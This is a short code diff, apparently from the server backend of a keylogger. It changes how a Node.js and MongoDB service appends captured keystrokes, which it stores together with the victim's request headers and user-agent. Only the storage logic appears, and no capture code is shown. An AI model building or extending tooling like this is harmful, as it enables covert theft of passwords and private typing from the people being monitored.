@@ -704,7 +704,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 												'keylogger.timestamp': timestamp
 											},
 											{
-												$addToSet: {
+												$pushAll: {
 													'keylogger.$.keys' : keystrokes
 												}
 											}).then((e) => {
@@ -726,9 +726,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 																	headers		: headers,
 																	'user-agent': parseAgent(headers["user-agent"])
 																},
-																keys : [
-																	keystrokes
-																]
+																keys : keystrokes
 															}
 														}
 													}).then(() => {
